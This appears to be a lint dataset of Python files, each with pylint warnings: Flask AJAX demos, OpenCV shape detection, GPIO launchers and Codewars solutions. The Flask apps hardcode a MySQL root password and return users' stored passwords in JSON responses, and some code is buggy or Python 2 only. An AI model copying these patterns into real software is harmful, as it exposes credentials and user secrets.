41       # list = [""Fan Bingbing"",""Li Chen"",""Cui Yongyuan""]
42       dic = {
43           'name' : 'Bingbing Fan',
44           'age' : 40,
45           'gender' : ""female""
46       }
47       uList = [
48           {
49               'name' : 'Bingbing Fan',
50               'age' : 40,
51               'gender' : ""female""
52           },
53           {
54               'name' : 'Li Chen',
55               ""age"" : 40,
56               ""gender"" : 'male'
57           }
58       ]
59       # jsonStr = json.dumps(list)
60       jsonStr = json.dumps(dic)
61       return jsonStr
62   
63   @app.route('/page')
64   def page_views():
65       return render_template('01-page.html')
66   
67   @app.route('/json_users')
68   def json_users():
69       # user = Users.query.filter_by(id=1).first()
70       # print(user)
71       # return json.dumps(user.to_dict())
72       users = Users.query.filter_by(id=1).all()
73       print(users)
74       list = []
75       for user in users:
76           list.append(user.to_dict())
77       return json.dumps(list)
78   
79   @app.route('/show_info')
80   def show_views():
81       return render_template('02-user.html')
82   
83   @app.route('/server')
84   def server_views():
85       users = Users.query.filter().all()
86       list = []
87       for user in users:
88           list.append(user.to_dict())
89       return json.dumps(list)
90   
91   @app.route('/load')
92   def load_views():
93       return render_template('04-load.html')
94   
95   @app.route('/load_server')
96   def load_server():
97       return ""这是使用jquery的load方法发送的请求""
98   
99   if __name__ == ""__main__"":
100       app.run(debug=True)","47 - warning: unused-variable
74 - warning: redefined-builtin
86 - warning: redefined-builtin
"
"1   from flask import Flask, render_template, request
2   from flask_sqlalchemy import SQLAlchemy
3   import json
4   
5   import pymysql
6   pymysql.install_as_MySQLdb()
7   
8   app = Flask(__name__)
9   app.config['SQLALCHEMY_DATABASE_URI']=""mysql://root:horsin@123@localhost:3306/flask""
10   app.config['SQLALCHEMY_COMMIT_ON_TEARDOWN']=True
11   
12   db = SQLAlchemy(app)
13   
14   class Users(db.Model):
15       __tablename__ = ""loginUser""
16       id = db.Column(db.Integer, primary_key=True, autoincrement=True)
17       username = db.Column(db.String(30), unique=True)
18       passwd = db.Column(db.String(120))
19   
20       def __init__(self, username):
21           self.username = username
22   
23       def to_dict(self):
24           dic = {
25               ""username"" : self.username,
26               ""passwd"" : self.passwd
27           }
28           return dic
29   
30       def __repr__(self):
31           return ""<Users : %r>"" % self.username
32   
33   class Province(db.Model):
34       __tablename__=""province""
35       id = db.Column(db.Integer, primary_key=True, autoincrement=True)
36       proname = db.Column(db.String(30))
37       cities = db.relationship(""City"", backref=""province"", lazy=""dynamic"")
38   
39       def __init__(self, proname):
40           self.proname = proname
41   
42       def __repr__(self):
43           return ""<Province : %r>"" % self.proname
44   
45       def to_dict(self):
46           dic = {
47               ""id"" : self.id,
48               ""proname"" : self.proname
49           }
50           return dic
51   
52   class City(db.Model):
53       __tablename__=""city""
54       id = db.Column(db.Integer, primary_key=True, autoincrement=True)
55       cityname = db.Column(db.String(30))
56       pro_id = db.Column(db.Integer, db.ForeignKey(""province.id""))
57   
58       def __init__(self, cityname, pro_id):
59           self.cityname = cityname
60           self.pro_id = pro_id
61   
62       def __repr__(self):
63           return ""<City : %r>"" % self.cityname
64   
65       def to_dict(self):
66           dic = {
67               ""id"" : self.id,
68               ""cityname"" : self.cityname,
69               ""pro_id"" : self.pro_id
70           }
71           return dic
72   
73   @app.route('/01-ajax')
74   def ajax_views():
75       return render_template('01-ajax.html')
76   
77   @app.route('/01-server')
78   def server_01():
79       uname = request.args.get(""username"")
80       print(uname)
81       user = Users.query.filter_by(username=uname).first()
82       if user:
83           return json.dumps(user.to_dict())
84       else:
85           dic = {
86               'status' : '0',
87               'msg' : '没有查到任何信息!'
88           }
89           return dic
90   
91   @app.route('/02-province')
92   def province_views():
93       return render_template('03-province.html')
94   
95   @app.route('/loadPro')
96   def loadPro_views():
97       provinces = Province.query.all()
98       list = []
99       for province in provinces:
100           list.append(province.to_dict())
101       return json.dumps(list)
102   
103   @app.route('/loadCity')
104   def loadCity_views():
105       pid = request.args.get(""pid"")
106       cities = City.query.filter_by(pro_id=pid).all()
107       list = []
108       for city in cities:
109           list.append(city.to_dict())
110       return json.dumps(list)
111   
112   @app.route('/crossdomain')
113   def crossdomain_views():
114       return render_template('04-crossdomain.html')
115   
116   @app.route('/02-server')
117   def server_02():
118       return ""show('这是server_02响应回来的数据')""
119   
120   if __name__ == '__main__':
121       app.run(debug=True)
122   
123   
124   
125   
126   
","82 - refactor: no-else-return
98 - warning: redefined-builtin
107 - warning: redefined-builtin
"
"1   from flask import Flask, render_template, request
2   from flask_sqlalchemy import SQLAlchemy
3   import json
4   
5   import pymysql
6   pymysql.install_as_MySQLdb()
7   
8   app = Flask(__name__)
9   app.config[""SQLALCHEMY_DATABASE_URI""]=""mysql://root:horsin@123@localhost:3306/flask""
10   app.config['SQLALCHEMY_COMMIT_ON_TEARDOWN'] = True
11   
12   db = SQLAlchemy(app)
13   
14   class Province(db.Model):
15       __tablename__ = ""province""
16       id = db.Column(db.Integer, primary_key=True, autoincrement=True)
17       proname = db.Column(db.String(30), nullable=False)
18       cities = db.relationship(""City"", backref=""province"", lazy=""dynamic"")
19   
20       def __init__(self, proname):
21           self.proname = proname
22   
23       def to_dict(self):
24           dic = {
25               'id' : self.id,
26               'proname' : self.proname
27           }
28           return dic
29   
30       def __repr__(self):
31           return ""<Province : %r>"" % self.proname
32   
33   class City(db.Model):
34       __tablename__ = ""city""
35       id = db.Column(db.Integer, primary_key=True, autoincrement=True)
36       cityname = db.Column(db.String(30), nullable=False)
37       pro_id = db.Column(db.Integer, db.ForeignKey(""province.id""))
38   
39       def __init__(self, cityname, pro_id):
40           self.cityname = cityname
41           self.pro_id = pro_id
42   
43       def to_dict(self):
44           dic = {
45               'id' : self.id,
46               'cityname' : self.cityname,
47               'pro_id' : self.pro_id
48           }
49           return dic
50   
51       def __repr__(self):
52           return ""<City : %r>"" % self.cityname
53   
54   db.create_all()
55   
56   @app.route('/province')
57   def province_views():
58       return render_template('03-province.html')
59   
60   @app.route('/loadPro')
61   def loadPro_views():
62       provinces = Province.query.all()
63       list = []
64       for pro in provinces:
65           list.append(pro.to_dict())
66       return json.dumps(list)
67   
68   @app.route('/loadCity')
69   def loadCity_view():
70       pid = request.args.get('pid')
71       cities = City.query.filter_by(pro_id=pid).all()
72       list = []
73       for city in cities:
74           list.append(city.to_dict())
75       return list
76   
77   if __name__ == ""__main__"":
78       app.run(debug=True)
","63 - warning: redefined-builtin
72 - warning: redefined-builtin
"
"1   from flask import Flask, render_template, request
2   
3   app = Flask(__name__)
4   
5   @app.route('/01-getxhr')
6   def getxhr():
7       return render_template('01-getxhr.html')
8   
9   @app.route('/02-get')
10   def get_views():
11       return render_template('02-get.html')
12   
13   @app.route('/03-get')
14   def get03_view():
15       return render_template('03-get.html')
16   
17   @app.route('/02-server')
18   def server02_views():
19       return ""这是AJAX的请求""
20   
21   @app.route('/03-server')
22   def server03_views():
23       uname = request.args.get('uname')
24       return ""欢迎: ""+uname
25   
26   @app.route('/04-post')
27   def post_views():
28       return render_template('04-post.html')
29   
30   @app.route('/04-server', methods=['POST'])
31   def server04_views():
32       uname = request.form['uname']
33       return uname
34   
35   @app.route('/05-post')
36   def post05_views():
37       return render_template('05-post.html')
38   
39   if __name__ == '__main__':
40       app.run(debug=True)","Clean Code: No Issues Detected
"
"1   import cv2
2   import numpy as np
3   
4   # minDist = 120
5   # param1 = 50 
6   # param2 = 30
7   # minRadius = 5
8   # maxRadius = 0
9   
10   def circleScan(frame, camX, camY):
11       gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)
12       blurred = cv2.GaussianBlur(gray,(11,11),0)
13       circles = cv2.HoughCircles(blurred, cv2.HOUGH_GRADIENT, 1,120, param1=220, param2=30, minRadius=50, maxRadius=300)
14   
15       # circles = cv2.HoughCircles(gray, cv2.HOUGH_GRADIENT, 1, minDist, param1=param1, param2=param2, minRadius=minRadius, maxRadius=maxRadius)
16       if circles is not None:
17           circles = np.round(circles[0, :]).astype(""int"")
18           for (x, y, r) in circles:
19               cv2.circle(frame, (x, y), r, (0, 255, 0), 4)
20               cv2.rectangle(frame, (x - 5, y - 5),
21                           (x + 5, y + 5), (0, 128, 255), -1)
22               x = x - camX/2
23               y = (y - camY/2) * -1
24               return [x,y]
25   
26   
27   
28   # circles = cv2.HoughCircles(gray, cv2.HOUGH_GRADIENT, 1.2, 100)
","10 - refactor: inconsistent-return-statements
"
"1   import RPi.GPIO as GPIO
2   import time
3   import os
4   
5   GPIO.setmode(GPIO.BCM)
6   GPIO.setup(""1"",GPIO.IN)
7   GPIO.setup(""2"",GPIO.IN)
8   
9   input = GPIO.input(""1"")
10   input = GPIO.input(""2"")
11   
12   
13   while True:
14           inputValue = GPIO.input(""1"")
15           if (inputValue == False):
16               print(""1. Görev"")
17               os.system('..\\daire\\main.py') # Daha verimli
18           # if keyboard.is_pressed(""2""):
19           #     os.system('..\\dikdörtgen\\main.py') # Daha verimli
20           # if keyboard.is_pressed(""3""):
21           #     print(""3. Görev"")
22           #     # os.startfile('..\\daire\\main.py')","14 - warning: bad-indentation
15 - warning: bad-indentation
16 - warning: bad-indentation
17 - warning: bad-indentation
9 - warning: redefined-builtin
1 - refactor: consider-using-from-import
2 - warning: unused-import
"
"1   import keyboard
2   import os
3   
4   while True:
5       if keyboard.is_pressed(""1""):
6           print(""1. Görev"")
7           os.system('..\\daire\\main.py')
8       if keyboard.is_pressed(""2""):
9           os.system('..\\dikdörtgen\\main.py')
10       if keyboard.is_pressed(""3""):
11           print(""3. Görev"")","Clean Code: No Issues Detected
"
"1   import cv2
2   from daire import circleScan
3   import keyboard
4   import os
5   
6   cameraX = 800
7   cameraY = 600
8   
9   cap = cv2.VideoCapture(0)
10   # Cemberin merkezinin ekranın orta noktaya uzaklıgını x ve y cinsinden uzaklıgı 
11   while True:
12       if keyboard.is_pressed(""2""):
13           print(""2. Görev"")
14           cap.release()
15           cv2.destroyAllWindows()
16           os.system('..\\dikdörtgen\\main.py') # Daha verimli
17           break
18       if keyboard.is_pressed(""3""):
19           cap.release()
20           cv2.destroyAllWindows()
21           print(""3. Görev"")
22           break
23       
24       ret, frame = cap.read()
25       frame = cv2.resize(frame, (cameraX, cameraY))
26       data = circleScan(frame, cameraX, cameraY)
27       if data is not None:
28           print(""X : "" ,data[0] , ""  Y : "" , data[1])
29   
30       cv2.imshow(""output"", frame)
31   
32       if cv2.waitKey(1) & 0xFF == ord('q'):
33           break
34   cap.release()
35   cv2.destroyAllWindows()","Clean Code: No Issues Detected
"
"1   import cv2
2   # import numpy as np
3   import keyboard
4   import os
5   
6   cameraX = 800
7   cameraY = 600
8   
9   cap = cv2.VideoCapture(0)
10   
11   while(True):
12       if keyboard.is_pressed(""1""):
13           print(""1. Görev Dikdortgende"")
14           cap.release()
15           cv2.destroyAllWindows()
16           os.system('..\\daire\\main.py') # Daha verimli
17           break
18       if keyboard.is_pressed(""3""):
19           print(""3. Görev Dikdortgende"")
20           break
21   
22       ret, image = cap.read()
23       image = cv2.resize(image, (cameraX, cameraY))
24       original = image.copy()
25       cv2.rectangle(original, (395, 295),
26                   (405, 305), (0, 128, 50), -1)
27       blurred = cv2.medianBlur(image, 3)
28       # blurred = cv2.GaussianBlur(hsv,(3,3),0)
29   
30       hsv = cv2.cvtColor(blurred, cv2.COLOR_BGR2HSV)
31       mask = cv2.inRange(hsv,(15,0,0), (29, 255, 255))
32       cnts,_ = cv2.findContours(mask, cv2.RETR_TREE, cv2.CHAIN_APPROX_SIMPLE)
33       
34       minArea = []
35       minC = []
36       for c in cnts:
37           area = cv2.contourArea(c)
38           if area > 400:
39               approx = cv2.approxPolyDP(c, 0.125 * cv2.arcLength(c, True), True)
40               if(len(approx) == 4): 
41                   minArea.append(area)
42                   minC.append([area, c])
43       if minArea:
44           minArea.sort()
45           print(minArea)
46           mArea = minArea[0]
47           mC = []
48           for x in minC:
49               if x[0] == mArea:
50                   mC = x[1]
51           
52           M = cv2.moments(mC)
53           cx = int(M['m10']/M['m00'])
54           cy = int(M['m01']/M['m00'])
55   
56           x = cx - cameraX/2
57           y = (cy - cameraY/2) * -1
58           print(cx, cy  , x , y)
59           cv2.rectangle(original, (cx - 5, cy - 5),
60                       (cx + 5, cy + 5), (0, 128, 255), -1)
61           cv2.drawContours(original, [approx], 0, (0, 0, 255), 5)
62           
63       cv2.imshow('mask', mask)
64       cv2.imshow('original', original)
65   
66       if cv2.waitKey(1) & 0xFF == ord('q'):
67           cap.release()
68           break
69       
70   cv2.destroyAllWindows()","Clean Code: No Issues Detected
"
"1   import cv2 as cv
2   import numpy as np
3   import sys
4   from matplotlib import pyplot as plt
5   
6   def main():
7       square = cv.imread('./img/square.png')
8       ball = cv.imread('./img/ball.png')
9       mask = cv.imread('./img/mask2.png')
10   
11       square_gray = cv.cvtColor(square, cv.COLOR_BGR2GRAY)
12       ball_gray = cv.cvtColor(ball, cv.COLOR_BGR2GRAY)
13   
14       args = sys.argv
15       if (len(args) > 1):
16           if (args[1] == 'add'):
17               title = 'Sum'
18               image = add(square, ball)
19           elif (args[1] == 'sub'):
20               title = 'Subtraction'
21               image = sub(square, ball)
22           elif (args[1] == 'mult'):
23               title = 'Multiplication'
24               image = mult(square, ball)
25           elif (args[1] == 'div'):
26               title = 'Division'
27               image = div(square, ball)
28           elif (args[1] == 'and'):
29               title = 'And operation'
30               image = andF(square, ball)
31           elif (args[1] == 'or'):
32               title = 'Or operation'
33               image = orF(square, ball)
34           elif (args[1] == 'xor'):
35               title = 'Xor operation'
36               image = xorF(square, ball)
37           elif (args[1] == 'not'):
38               title = 'Not operation'
39               image = notF(square, ball)
40           elif (args[1] == 'blur'):
41               title = 'Blur'
42               image = blur(mask)
43           elif (args[1] == 'box'):
44               title = 'Box filter'
45               image = box(mask)
46           elif (args[1] == 'median'):
47               title = 'Median filter'
48               image = median(mask)
49           elif (args[1] == 'dd'):
50               title = '2D filter'
51               image = dd(mask)
52           elif (args[1] == 'gaussian'):
53               title = 'Gaussian filter'
54               image = gaussian(mask)
55           elif (args[1] == 'bilateral'):
56               title = 'Bilateral filter'
57               image = bilateral(mask)
58           else:
59               print('(!) -- Error - no operation called')
60               exit(0)
61   
62           if (len(args) > 2 and args[2] == 'special'):
63               original = mask if args[1] == 'blur' or args[1] == 'box' or args[1] == 'median' or args[1] == 'dd' or args[1] == 'gaussian' or args[1] == 'bilateral' else square
64               plt.subplot(121),plt.imshow(original),plt.title('Original')
65               plt.xticks([]), plt.yticks([])
66               plt.subplot(122),plt.imshow(image),plt.title(title)
67               plt.xticks([]), plt.yticks([])
68               plt.show()
69           else:
70               cv.imshow(title, image)
71               cv.waitKey(15000)
72               cv.destroyAllWindows()
73       else:
74           print('(!) -- Error - no operation called')
75           exit(0)
76   
77   def add(image1, image2):
78       # return cv.add(image1, image2, 0)
79       return cv.addWeighted(image1, 0.7, image2, 0.3, 0)
80   
81   def sub(image1, image2):
82       return cv.subtract(image1, image2, 0)
83   
84   def mult(image1, image2):
85       return cv.multiply(image1, image2)
86   
87   def div(image1, image2):
88       return cv.divide(image1, image2)
89   
90   def andF(image1, image2):
91       return cv.bitwise_and(image1, image2)
92   
93   def orF(image1, image2):
94       return cv.bitwise_or(image1, image2)
95   
96   def xorF(image1, image2):
97       return cv.bitwise_xor(image1, image2)
98   
99   def notF(image1, image2):
100       return cv.bitwise_not(image1)
101   
102   def blur(image1):
103       return cv.blur(image1, (5, 5))
104   
105   def box(image1):
106       return cv.boxFilter(image1, 50, (5, 5), False)
107   
108   def median(image1):
109       return cv.medianBlur(image1, 5)
110   
111   def dd(image1):
112       kernel = np.ones((5,5),np.float32)/25
113       return cv.filter2D(image1, -1, kernel)
114   
115   def gaussian(image1):
116       return cv.GaussianBlur(image1, (5, 5), 0)
117   
118   def bilateral(image1):
119       return cv.bilateralFilter(image1, 9, 75, 75)
120   
121   if __name__ == '__main__':
122       main()
","60 - refactor: consider-using-sys-exit
64 - warning: expression-not-assigned
65 - warning: expression-not-assigned
66 - warning: expression-not-assigned
67 - warning: expression-not-assigned
75 - refactor: consider-using-sys-exit
6 - refactor: too-many-branches
6 - refactor: too-many-statements
11 - warning: unused-variable
12 - warning: unused-variable
99 - warning: unused-argument
"
"1   """"""
2   	Sudoku Solution Validator
3   	http://www.codewars.com/kata/529bf0e9bdf7657179000008/train/python
4   """"""
5   
6   def validSolution(board):
7   	test = range(1,10,1)
8   	def tester(alist):
9   		return set(test)==set(alist)
10   
11   	for i in range(len(board)):
12   		tem = board[i]
13   		if not tester(tem):
14   			return False
15   	
16   	
17   	for i in range(len(board[0])):
18   		if not tester([alist[i] for alist in board]):
19   			return False
20   
21   
22   	for i in range(3):
23   		for j in range(3):
24   			if not tester(sum([alist[j*3:j*3+3] for alist in board[i*3:i*3+3]] , [])):
25   				return False
26   
27   	return True
28   
29   
30   boardOne = [[5, 3, 4, 6, 7, 8, 9, 1, 2], 
31                  [6, 7, 2, 1, 9, 0, 3, 4, 8],
32                  [1, 0, 0, 3, 4, 2, 5, 6, 0],
33                  [8, 5, 9, 7, 6, 1, 0, 2, 0],
34                  [4, 2, 6, 8, 5, 3, 7, 9, 1],
35                  [7, 1, 3, 9, 2, 4, 8, 5, 6],
36                  [9, 0, 1, 5, 3, 7, 2, 1, 4],
37                  [2, 8, 7, 4, 1, 9, 6, 3, 5],
38                  [3, 0, 0, 4, 8, 1, 1, 7, 9]]
39   
40   
41   boardTwo =[[5, 3, 4, 6, 7, 8, 9, 1, 2], 
42                  [6, 7, 2, 1, 9, 5, 3, 4, 8],
43                  [1, 9, 8, 3, 4, 2, 5, 6, 7],
44                  [8, 5, 9, 7, 6, 1, 4, 2, 3],
45                  [4, 2, 6, 8, 5, 3, 7, 9, 1],
46                  [7, 1, 3, 9, 2, 4, 8, 5, 6],
47                  [9, 6, 1, 5, 3, 7, 2, 8, 4],
48                  [2, 8, 7, 4, 1, 9, 6, 3, 5],
49                  [3, 4, 5, 2, 8, 6, 1, 7, 9]]
50   
51   
52   print validSolution(boardOne)
53   print validSolution(boardTwo)","52 - error: syntax-error
"
"1   """"""
2   	Validate Sudoku with size `NxN`
3   	http://www.codewars.com/kata/540afbe2dc9f615d5e000425/train/python
4   """"""
5   
","Clean Code: No Issues Detected
"
"1   """"""
2   	Vigenere Autokey Cipher Helper
3   	http://www.codewars.com/kata/vigenere-autokey-cipher-helper
4   """"""
5   
6   class VigenereAutokeyCipher:
7   	def __init__(self, key, alphabet):
8   		self.key = key
9   		self.alphabet = alphabet
10   		
11   	def code(self, text, direction):
12   
13   		toText = list(text)
14   		result = []
15   		newKey = filter(lambda x: (x in self.alphabet) == True, list(self.key)) #+  filter(lambda x: (x in self.alphabet) == True, toEncode)
16   	
17   		#print  'new' ,newKey	
18   		j = 0	
19   		for i in range(len(toText)):
20   			#print i ,self.key[i%(len(self.key))]
21   			if toText[i] in self.alphabet:
22   				if direction:
23   					newKey.append(toText[i])
24   					result.append(self.alphabet[(self.alphabet.index(toText[i]) + self.alphabet.index(newKey[j]))%len(self.alphabet)])
25   				else:
26   					result.append(self.alphabet[(self.alphabet.index(toText[i]) - self.alphabet.index(newKey[j]))%len(self.alphabet)])
27   					newKey.append(result[-1])
28   				j += 1
29   			else:
30   				result.append(toText[i])
31   		return ''.join(result)
32   
33   
34   	def encode(self, toEncode):
35   		return self.code(toEncode,1)
36   		
37   
38   
39   	def decode(self, toDecode):
40   		return self.code(toDecode, 0)
41   
42   
43   def main():
44   	alphabet = 'abcdefghijklmnopqrstuvwxyz'
45   	#alphabet = 'abcdefgh'
46   	key = 'password'
47   	tester = VigenereAutokeyCipher(key,alphabet)
48   
49   	print tester.encode('codewars')
50   	print tester.encode('amazingly few discotheques provide jukeboxes') 
51   	print 'pmsrebxoy rev lvynmylatcwu dkvzyxi bjbswwaib'
52   
53   	print tester.decode('pmsrebxoy rev lvynmylatcwu dkvzyxi bjbswwaib')
54   	print 'amazingly few discotheques provide jukeboxes'
55   
56   if __name__ == '__main__':
57   	main()","49 - error: syntax-error
"
"1   '''
2   
3   http://www.codewars.com/kata/53d3173cf4eb7605c10001a8/train/python
4   
5   Write a function that returns all of the sublists of a list or Array.
6   Your function should be pure; it cannot modify its input.
7   
8   Example:
9   power([1,2,3])
10   # => [[], [1], [2], [1, 2], [3], [1, 3], [2, 3], [1, 2, 3]]
11   '''
12   
13   def power(s):
14      	""""""Computes all of the sublists of s""""""
15      	length = len(s)
16      	count = 2**length 
17      	result = []
18      	for i in range(count):
19      		st = str(bin(i)[2:]).zfill(length)
20      		temp = []
21      		for j in range(length):
22      			if st[length - 1 - j] == str(1):
23      				temp.append(s[j])
24      		result.append(temp)
25      	return result
26   
27   def powersetlist(s):
28       r = [[]]
29       for e in s:
30          # print ""r: %-55r e: %r"" % (r,e)
31           r += [x+[e] for x in r]
32       return r
33    
34      
35   #print ""\npowersetlist(%r) =\n  %r"" % (s, powersetlist(s))
36   
37   
38   #print power([0,1,2,3])
39   if __name__ == '__main__':
40     print power([0,1,2,3])
41      ","40 - error: syntax-error
"
"1   """"""
2   Create the function prefill that returns an array of n elements that all have the same value v. See if you can do this without using a loop.
3   
4   You have to validate input:
5   
6   v can be anything (primitive or otherwise)
7   if v is ommited, fill the array with undefined
8   if n is 0, return an empty array
9   if n is anything other than an integer or integer-formatted string (e.g. '123') that is >=0, throw a TypeError
10   When throwing a TypeError, the message should be n is invalid, where you replace n for the actual value passed to the function.
11   
12   	see: http://www.codewars.com/kata/54129112fb7c188740000162/train/python
13   
14   """"""
15   
16   def prefill(n,v=None):
17       #your code here
18       try:
19       	if isNumber(n):
20       		if v is None:
21       			return ['undefined'] * int(n)
22       		return [v]*int(n)
23       	raise TypeError
24       except TypeError:
25       	return str(n) + "" is invalid.""
26   
27   
28   def isNumber(n):
29   	if isinstance( n, int ):
30   		return True
31   	elif isinstance( n , str) and n.isdigit():
32   		if int(n):
33   			return True
34   	return False
35   
36   
37   
38   	
39   print prefill(5,)
40   print prefill(5,prefill(3,'abc'))
41   print prefill(3,5)
42   
43   print isNumber(5.3)
44   
","39 - error: syntax-error
"
"1   '''
2   	Where my anagrams at?
3   	http://www.codewars.com/kata/523a86aa4230ebb5420001e1/train/python
4   	Also could construct prime list, assign each character from word to a prime number. multiply them 
5   	then divid prime number from word in words.
6   '''
7   
8   def anagrams(word, words):
9       #your code here
10       
11       return filter(lambda x: sorted(x) == sorted(word) , words)
12     
13   
14   
15   print anagrams(""thisis"" , [""thisis"", ""isthis"", ""thisisis""])
16   print anagrams('racer', ['crazer', 'carer', 'racar', 'caers', 'racer'])
17   print anagrams('laser', ['lazing', 'lazy',  'lacer'])","15 - error: syntax-error
"
"1   def sierpinski(n):
2       result = []
3       for i in range(0,n+1):
4           if i == 0:
5               result.append('""')
6           else:
7               for j in range(2**(i-1),2**i):
8               	result.append(addSpace(j,i,result))	
9       r = result[0]
10       for line in result[1:]:
11           r= r+'\n'+line
12       return r
13   
14   def addSpace(l,n,string_list):
15       result = string_list[l-2**(n-1)]
16       space = len(range(0,2*2**(n-1)-l)) * 2 - 1 
17       for i in range(0,space):
18           result = ' ' +result
19       return string_list[l-2**(n-1)]+result
20   
21   
22   
23   #print sierpinski(1)
24   print sierpinski(6)","24 - error: syntax-error
"
"1   """"""
2   	The Millionth Fibonacci Kata
3   	http://www.codewars.com/kata/53d40c1e2f13e331fc000c26/train/python
4   """"""
5   import math
6   import sys
7   import time
8   from collections import defaultdict
9   
10   # following not working , took too much time to compute.
11   
12   def fib(n , i):
13   
14   
15   	dic = defaultdict(list)
16   
17   	def find_dim(k):
18   		if k == 0:
19   			return []
20     		if k == 1:
21     			return [0]
22     		else:
23     			return [int(math.log(k,2))] + find_dim(k - 2**(int(math.log(k,2))))
24   	  		
25   	def matrix_multi(a, b):
26   		return [a[0]*b[0]+a[1]*b[2],
27   				a[0]*b[1]+a[1]*b[3],
28   				a[2]*b[0]+a[3]*b[2],
29   				a[2]*b[1]+a[3]*b[3]]
30   
31     	
32   	def matrix_power(pow):
33   		a = [1,1,1,0]
34   		if pow in dic:
35   			return dic[pow]
36   		else:
37   			if pow == 0:
38   				return a
39   			else:
40   				for i in range(1,pow+1):
41   					if i not in dic:
42   						a = matrix_multi(a , a)
43   						dic[i] = a
44   						
45   					else:
46   						a = dic[i]
47    				return a
48   	#print matrix_power([1,1,1,0])
49   
50   	def matrix_fib(t):
51   		if t == 0 or t == 1:
52   			return t
53   		else:
54   			result = [1,0,0,1]
55   			alist = find_dim(t-1)
56   			for i in alist:
57   				result = matrix_multi(result,matrix_power(i))
58   			return result
59   	
60   	def dynamic_fib(n):
61   		a = 0
62   		b = 1
63   		if n == 0:
64   			return (a , b)
65   	
66   		for i in range(n):
67   			temp = a + b
68   			a = b
69   			b = temp
70   		return (a , b )
71   
72   
73   
74   	def double_fast(n):
75   		#really fast
76   		if n == 0:
77   			return (0 , 1)
78   		else:
79   			a, b = double_fast(n/2)
80   			c = a * (2* b -a )
81   			d = b **2 + a**2
82   			if n%2 == 0:
83   				return (c , d)
84   			else:
85   				return (d , d+c)
86   
87   	def compute_fib(n ,i ):
88   		func = {0: matrix_fib,
89   		        1: double_fast,
90   		        2: dynamic_fib }
91   
92   
93   		return func[i](n)[0] if n >= 0 else (-1)**(n%2+1) * func[i](-n)[0]
94   
95   
96   
97   
98   	
99   	return compute_fib(n , i)
100   
101   def size_base10(n):
102   		size = 0
103   		while n /10 != 0:
104   			size += 1
105   			n = n/10
106   		
107   		return size
108   
109   
110   def main():
111   	'''
112   		func = {0: matrix_fib,
113   		        1: double_fast,
114   		        2: dynamic_fib }
115   	'''
116   	try:
117   		#var = int(raw_input(""Please enter the n-th Fib number you want:""))
118   		var = 200000
119   		start = time.time()
120   		i = 1
121   		result = fib(var , i)
122   
123   		end = time.time()
124   		
125   		#print ""Lenght of %dth fib number is %d"" %(var , size_base10(result))
126   		print ""Time is %s seconds."" % (end - start)
127   		#print result
128   		#print ""The %dth fib number is %d""%(var , result)
129   	except:
130   		pass
131   	
132   
133   if __name__ == '__main__':
134   	main()
135   
136   
137   
","20 - error: syntax-error
"
"1   """"""
2   	Square into Squares. Protect trees!
3   	http://www.codewars.com/kata/square-into-squares-protect-trees
4   """"""
5   import math
6   
7   def decompose(n):
8       # your code
9       def sub_decompose(s,i):
10       	if s < 0 :
11       		return None
12       	if s == 0:
13       		return []
14       	for j in xrange(i-1, 0 ,-1):
15       		#print  s,s - j**2 ,j
16       		sub = sub_decompose(s - j**2, j)
17       		#print j,sub
18       		if sub != None:
19       		#	print  s,j,sub
20       			return sub + [j]
21       return sub_decompose(n**2,n)
22   
23   if __name__ == ""__main__"":
24   	print decompose(11)
","24 - error: syntax-error
"
"1   """"""
2   Going to zero or to infinity?
3   http://www.codewars.com/kata/55a29405bc7d2efaff00007c/train/python
4   """"""
5   
6   import math
7   def going(n):	 
8   	result = 0
9   	for i in range(n):
10   		result = 1.0*result/(i+1) + 1
11   	return math.floor(result * (10**6))/(10**6)
12   
13   
14   
15   
16   if __name__ == ""__main__"":
17   	for i in range(10):
18   		print i, going(i)","18 - error: syntax-error
"
"1   def solution(n):
2   # TODO convert int to roman string
3   	result = """"
4   	
5   
6   	remainder = n
7   	if n == 0:
8   		return """"
9   	for i in range(0,len(roman_number)):
10   		time = 1.0*remainder/roman_number[i][0]
11   		if str(roman_number[i][0])[0] == '1':
12   			if time < 4 and time >=1:
13   				temp = remainder % roman_number[i][0]
14   				div = remainder / roman_number[i][0]
15   				remainder = temp
16   				result += div * roman_number[i][1]
17   			if time < 1 and time >= 0.9:
18   				result += (roman_number[i+2][1]+roman_number[i][1])
19   				remainder = remainder % roman_number[i+2][0]
20   		else:
21   			if  time < 1 and time >= 0.8:
22   				result += (roman_number[i+1][1]+roman_number[i][1])
23   			   	remainder = remainder % roman_number[i+1][0]
24   			if time >= 1 and time < 1.8:
25   				div = (remainder - roman_number[i][0]) / roman_number[i+1][0]
26   				result += roman_number[i][1] + div * roman_number[i+1][1]
27   				remainder = remainder % roman_number[i+1][0]
28   			if time >= 1.8:
29   				result +=  roman_number[i+1][1]+roman_number[i-1][1] 
30   				remainder = remainder % roman_number[i+1][0]
31   	return result
32   			
33   roman_number = [(1000, 'M'), (500, 'D'), (100, 'C'), (50, 'L'), (10, 'X'), (5, 'V'), (1, 'I')]
34   
35   #print solution(4)
36   #print solution(6)
37   print solution(3991)","23 - error: syntax-error
"
"1   '''
2   A poor miner is trapped in a mine and you have to help him to get out !
3   
4   Only, the mine is all dark so you have to tell him where to go.
5   
6   In this kata, you will have to implement a method solve(map, miner, exit) that has to return the path the miner must take to reach the exit as an array of moves, such as : ['up', 'down', 'right', 'left']. There are 4 possible moves, up, down, left and right, no diagonal.
7   
8   map is a 2-dimensional array of boolean values, representing squares. false for walls, true for open squares (where the miner can walk). It will never be larger than 5 x 5. It is laid out as an array of columns. All columns will always be the same size, though not necessarily the same size as rows (in other words, maps can be rectangular). The map will never contain any loop, so there will always be only one possible path. The map may contain dead-ends though.
9   
10   miner is the position of the miner at the start, as an object made of two zero-based integer properties, x and y. For example {x:0, y:0} would be the top-left corner.
11   
12   exit is the position of the exit, in the same format as miner.
13   
14   Note that the miner can't go outside the map, as it is a tunnel.
15   
16   Let's take a pretty basic example :
17   
18   map = [[True, False],
19       [True, True]];
20   
21   solve(map, {'x':0,'y':0}, {'x':1,'y':1})
22   // Should return ['right', 'down']
23   
24   http://www.codewars.com/kata/5326ef17b7320ee2e00001df/train/python
25   
26   '''
27   
28   def solve(map, miner, exit):
29   	#your code here
30   	dirc = { 'right': [1,0],
31   			'left': [-1,0],
32   			'down':  [0,1],
33   			'up': [0,-1] }
34   
35   
36   	matrix = [[ int(map[i][j])   for i in range(len(map)) ] for j in range(len(map[0]))]
37   
38   	start = [ value for key , value in miner.itemiters() ]
39   	end = [ value for key , value in exit.itemiters() ]
40   
